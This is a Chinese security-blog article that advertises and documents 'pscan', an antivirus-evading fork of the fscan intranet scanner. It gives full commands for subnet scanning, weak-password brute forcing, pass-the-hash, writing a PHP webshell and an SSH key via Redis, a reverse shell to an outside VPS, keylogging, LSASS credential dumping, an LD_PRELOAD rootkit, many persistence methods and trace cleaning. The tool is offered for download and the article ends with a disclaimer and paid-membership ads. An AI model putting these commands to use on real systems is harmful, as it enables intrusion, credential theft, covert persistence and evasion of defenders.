---
title: 红队内网渗透利器，告别原版特征暴露（支持免杀）内网扫描爆破后渗透一站式落地
url: https://mp.weixin.qq.com/s/gyBWw8vcr6HyHLWa2CWKGw
source: Doonsec's feed
date: 2026-06-19
fetch_date: 2026-06-20T06:13:10.986858
---

# 红队内网渗透利器，告别原版特征暴露（支持免杀）内网扫描爆破后渗透一站式落地

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/ibrevicNauKAXmB5o5uEicJicEeAAhuLdwyPMFQIV0ul96nMU2Bw1mHQqMtZzanXF1qicxWjg0yyd9vHQY6g4tqFJrvrXBzcwAo33yqh9KRWCeY8/0?wx_fmt=jpeg)

# 红队内网渗透利器，告别原版特征暴露（支持免杀）内网扫描爆破后渗透一站式落地

ebzzaa
ebzzaa

渗透安全HackTwo

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

0x01 工具介绍

**pscan作为红队专属内网渗透新利器，基于Fscan最新版本二次魔改优化，彻底告别原版工具特征暴露问题，完美支持主流安全软件免杀绕过。工具重构全部命令参数、去除官方指纹特征，支持静默无痕迹运行，集内网存活探测、端口扫描、弱口令爆破、POC漏洞检测、后渗透利用功能于一体，实现内网渗透全流程一站式落地，适配各类实战攻防场景。**

![](https://mmbiz.qpic.cn/mmbiz_png/ibrevicNauKAVibQoibJJYYtHOtDo5uvTVr5N4xabJnxSwYDPmsFxdYSMSrWXC14xZKZZU8UvmyQmhAPoHUwFibTPTtC3nBTtI4ibbP4Vkl9KVMmI/640?wx_fmt=png&from=appmsg)

注意：现在只对常读和星标的公众号才展示大图推送，建议大家把**渗透安全HackTwo**"**设为****星标****⭐️******"**否****则可能就看不到了啦！**

**下载地址在末尾 #渗透安全HackTwo**

0x02 功能介绍

✨魔改版本功能

本版本对原版 fscan 做了以下修改以规避 HIDS 特征检测：

| 修改项 | 说明 |
| --- | --- |
| **参数名混淆** | 所有命令行参数重命名（见下方映射表） |
| **Banner 静默** | 启动时不输出 fscan ASCII Logo 和版本信息 |
| **模块名重命名** | Go 模块路径改为 `scanner/core`，去除项目名特征 |
| **预编译二进制** | 提供 `pscan.exe` 和 `core.exe` 两个版本 |

**免杀效果**

![](https://mmbiz.qpic.cn/mmbiz_png/ibrevicNauKAUIxKicpJjDY3uCaWCvuE5ibWIoOc1nDx1zaJlP2TPCtXXlb7bH1WFyAfzcyEsubba07HS13t05PgQsvDhVq35lxq7z6uf1FicKAw/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibrevicNauKAVlu6LvcXvuGfr21rXicgnaDicFbfdic5PiauRjQedX8QTzTUcVIlLdn2ia7JW5aEWYKN3xNnvYoSl5PWJs5ZS9uPPG0hMa5XgvuzjU/640?wx_fmt=png&from=appmsg)

**原版 ↔ 魔改参数映射：**

| 原参数 | 魔改后 | 说明 |
| --- | --- | --- |
| `-h` | **`-t`** | 目标 IP / 网段 / 域名 |
| `-eh` | **`-et`** | 排除主机 |
| `-ehf` | **`-etf`** | 排除主机文件 |
| `-p` | **`-tp`** | 端口 |
| `-ep` | **`-etp`** | 排除端口 |
| `-hf` | **`-tf`** | 主机列表文件 |
| `-pf` | **`-tpf`** | 端口列表文件 |
| `-m` | **`-st`** | 扫描模式 |
| `-t`（线程） | **`-tn`** | 端口扫描线程数 |
| `-time` | **`-tm`** | 超时时间(秒) |
| `-user` | **`-usr`** | 用户名 |
| `-pwd` | **`-pw`** | 密码 |
| `-usera` | **`-ua`** | 额外用户名 |
| `-pwda` | **`-pa`** | 额外密码 |
| `-userf` | **`-usrf`** | 用户名字典文件 |
| `-pwdf` | **`-pf`** | 密码字典文件 |
| `-upf` | **`-up`** | 用户名:密码对文件 |
| `-hashf` | **`-hf`** | 哈希文件 |
| `-hash` | **`-hv`** | 哈希值 |
| `-domain` | **`-dm`** | 域名 |
| `-sshkey` | **`-sk`** | SSH 私钥 |

## 后渗透插件列表

通过 `-local` 参数调用：

| 插件名 | 功能 | 平台 |
| --- | --- | --- |
| `systeminfo` | 系统信息收集 | 全平台 |
| `reverseshell` | 反弹 Shell | 全平台 |
| `forwardshell` | 正向 Shell | Windows |
| `socks5proxy` | 启动 SOCKS5 代理 | 全平台 |
| `keylogger` | 键盘记录 | Windows |
| `minidump` | LSASS 凭据提取 | Windows |
| `sshkey` | SSH 公钥注入 | Linux |
| `cleaner` | 痕迹清理 | 全平台 |
| `crontask` | Cron 持久化 | Linux |
| `systemdservice` | Systemd 服务持久化 | Linux |
| `ldpreload` | LD\_PRELOAD Rootkit | Linux |
| `winregistry` | 注册表持久化 | Windows |
| `winschtask` | 计划任务持久化 | Windows |
| `winservice` | 服务持久化 | Windows |
| `winstartup` | 启动项持久化 | Windows |
| `winlogon` | 登录脚本持久化 | Windows |
| `winwmi` | WMI 持久化 | Windows |
| `winbits` | BITS 任务持久化 | Windows |
| `winifeo` | IFEO 持久化 | Windows |

## WebUI 模式

本工具内置了 Web 管理界面（需使用 web 版本编译）。

```
# 启动 Web 服务pscan-web.exe# 指定监听端口pscan-web.exe -u# 启动后访问 http://127.0.0.1:8080
```

WebUI 功能：

* 图形化扫描任务管理
* 实时 WebSocket 结果推送
* 扫描预设保存
* 资产项目管理
* 多语言支持（中文/English）
* 深色模式

0x03 更新介绍

```
11 个检测模块：SQLi / XSS / CMDi / LFI / RCE / SSRF / XXE / API / 敏感信息 / WAF / JSPathFinder支持 GUI 图形界面和命令行两种模式多种报告格式：JSON / HTML / CSV / Markdown / Console基于 WVS v19.2 开源更名
```

0x04 使用介绍

📦安装与使用指南

### 内网扫描

```
# 全量扫描整个 C 段（最常用）pscan.exe -t 192.168.1.0/24# 仅存活探测（快速定位在线主机）pscan.exe -t 192.168.1.0/24 -ao# ICMP 模式存活探测pscan.exe -t 192.168.1.0/24 -st icmp# 存活探测 + 仅在线主机做端口扫描（跳过离线主机）pscan.exe -t 192.168.1.0/24 -ao -st all# 扫描多个网段pscan.exe -t 192.168.1.0/24,10.10.0.0/16# 扫描 IP 范围pscan.exe -t 192.168.1.1-100# 排除特定主机pscan.exe -t 192.168.1.0/24 -et 192.168.1.1,192.168.1.254# 从文件读取目标列表pscan.exe -tf targets.txt
```

### 端口与协议控制

```
# 扫描指定端口pscan.exe -t 192.168.1.0/24 -tp 22,80,443,3306,3389,6379# 扫描常用 Web 端口pscan.exe -t 192.168.1.0/24 -tp 80,81,443,8080,8443,9090# 扫描全部端口（慢，谨慎使用）pscan.exe -t 192.168.1.0/24 -tp 1-65535 -tn 1000# 排除特定端口pscan.exe -t 192.168.1.0/24 -etp 445,139# 跳过 Ping 探测（纯 TCP 扫描，适合禁 Ping 环境）pscan.exe -t 192.168.1.0/24 -np# 跳过 TCP 补充探测pscan.exe -t 192.168.1.0/24 -ntp# 调整扫描线程和超时（网络差时降低线程数）pscan.exe -t 192.168.1.0/24 -tn 200 -tm 5# 限制发包速率（规避流量检测）pscan.exe -t 192.168.1.0/24 -rate 1000
```

### 弱口令爆破

```
# 全量扫描 + 自动爆破（默认开启）pscan.exe -t 192.168.1.0/24# 禁用爆破（只扫端口和服务识别）pscan.exe -t 192.168.1.0/24 -nobr# 指定自定义凭据pscan.exe -t 192.168.1.0/24 -usr admin -pw admin123# 使用字典文件pscan.exe -t 192.168.1.0/24 -usrf users.txt -pf pass.txt# 使用用户名:密码对文件（每行 user:pass）pscan.exe -t 192.168.1.0/24 -up creds.txt# 添加额外用户/密码（与原字典合并）pscan.exe -t 192.168.1.0/24 -ua root,admin -pa 123456,password# 指定域名（用于域认证爆破）pscan.exe -t 192.168.1.0/24 -dm corp.local# SSH 私钥登录pscan.exe -t 192.168.1.100 -sk id_rsa# NTLM 哈希传递pscan.exe -t 192.168.1.100 -hv "aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0"
```

### Web 扫描

```
# 扫描单个 Web 站点pscan.exe -u http://192.168.1.100:8080# 扫描多个 URLpscan.exe -u http://192.168.1.100 -tp 80,443,8080# 带 Cookie 扫描pscan.exe -u http://192.168.1.100 -cookie "PHPSESSID=xxx"# 使用 HTTP 代理pscan.exe -u http://192.168.1.100 -proxy http://127.0.0.1:8080# 使用 SOCKS5 代理pscan.exe -t 192.168.1.0/24 -socks5 socks5://127.0.0.1:1080# 指定网卡（VPN 场景）pscan.exe -t 10.8.0.0/24 -iface 10.8.0.5
```

### POC 漏洞检测

```
# 全量扫描 + POC 检测（默认开启）pscan.exe -t 192.168.1.0/24# 禁用 POC 扫描（加快速度）pscan.exe -t 192.168.1.0/24 -nopoc# 全量 POC 扫描（更全面但更慢）pscan.exe -t 192.168.1.0/24 -full# 指定 POC 名称pscan.exe -t 192.168.1.100 -pocname thinkphp# 自定义 POC 脚本目录pscan.exe -t 192.168.1.100 -pocpath ./custom-pocs/# 调整 POC 并发数pscan.exe -t 192.168.1.0/24 -num 10# 启用 DNSLogpscan.exe -t 192.168.1.0/24 -dns
```

### 凭据复用与哈希传递

```
# NTLM 哈希传递（配合爆破模块使用）pscan.exe -t 192.168.1.100 -hv "31d6cfe0d16ae931b73c59d7e0c089c0"# 哈希文件批量传递pscan.exe -t 192.168.1.0/24 -hf hashes.txt# 复用域用户凭据pscan.exe -t 192.168.1.0/24 -usr administrator -pw P@ssw0rd -dm corp.local
```

### 后渗透利用

```
# 查看所有可用本地插件pscan.exe -local list# 收集系统信息pscan.exe -local systeminfo# 反弹 Shell（先在外网 VPS 监听）pscan.exe -local reverseshell -rsh your-vps.com:4444# 启动正向 Shell（等待目标连接）pscan.exe -local forwardshell -fsh-port 4444# 启动 SOCKS5 代理（本地监听 1080）pscan.exe -local socks5proxy -start-socks5 1080# Redis 写公钥pscan.exe -t 192.168.1.100 -st redis -rs "ssh-rsa AAAAB3N..."# Redis 写 Webshellpscan.exe -t 192.168.1.100 -st redis -rwp /var/www/html -rwc "<?php system($_GET['cmd']);?>"# 键盘记录pscan.exe -local keylogger -keylog-output keylog.txt# LSASS 凭证提取pscan.exe -local minidump# Windows 持久化（启动项）pscan.exe -local winstartup -win-pe C:\shell.exe# 清理痕迹pscan.exe -local cleaner
```

### 输出控制

```
# 指定输出文件pscan.exe -t 192.168.1.0/24 -o scan-result.txt# JSON 格式输出pscan.exe -t 192.168.1.0/24 -f json -o result.json# CSV 格式输出pscan.exe -t 192.168.1.0/24 -f csv -o result.csv# 不保存文件，仅屏幕输出pscan.exe -t 192.168.1.0/24 -no# 静默模式（减少输出量）pscan.exe -t 192.168.1.0/24 -silent# 调试模式（详细日志）pscan.exe -t 192.168.1.0/24 -debug# 输出性能统计pscan.exe -t 192.168.1.0/24 -perf
```

**0x05 内部VIP星球介绍-V1.5（福利）**

如果你想学习更多**渗透测试技术/应急溯源/免杀工具/挖洞SRC赚取漏洞赏金/红队打点等**欢迎加入我们**内部星球**可获得内部工具字典和享受内部资源和内部交流群，****每天更新1day/0day漏洞刷分上分******([2026POC更新至8922+](https://mp.weixin.qq.com/s?__biz=Mzg3ODE2MjkxMQ==&mid=2247497496&idx=2&sn=05fc9eb156cce34fff4a02b7d72092ae&scene=21#wechat_redirect))****，**包含全网一些**付费扫描****工具及内部原创的Burp自动化漏****洞探测插件/漏扫工具等，AI代审工具，最新挖洞技巧等**。shadon/Hunter/0zone/Zoomeye/Quake/Fofa高级会员/AI账号/CTFShow等各种账号会员共享。详情点击下方链接了解，觉得价格高的师傅后台回复" **星球** "有优惠券名额有限先到先得**❗️**啥都有**❗️**全网资源最新最丰富**❗️****（🤙截止目前已有2800+多位师傅选择加入❗️早加入早享受）**

最新漏洞情报分享：https://t.zsxq.com/DSAvv

**👉****[点击了解加入-->>内部VIP知识星球福利介绍V1.5版本-1day/0day漏洞库及内部资源更新](https://mp.weixin.qq.com/s?__biz=Mzg3ODE2MjkxMQ==&mid=2247497496&idx=2&sn=05fc9eb156cce34fff4a02b7d72092ae&scene=21#wechat_redirect)**

结尾

# 免责声明

# 获取方法

**公众号回复**20260619**获取下载、回复 加群 获取交流群**

# 最后必看-免责声明

文章中的案例或工具仅面向合法授权的企业安全建设行为，如您需要测试内容的可用性，请自行搭建靶机环境，勿用于非法行为。如用于其他用途，由使用者承担全部法律及连带责任，与作者和本公众号无关。本项目所有收录的poc均为漏洞的理论判断，不存在漏洞利用过程，不会对目标发起真实攻击和漏洞利用。文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用。如您在使用本工具或阅读文章的过程中存在任何非法行为，您需自行承担相应后果，我们将不承担任何法律及连带责任。本工具或文章或来源于网络，若有侵权请联系作者删除，请...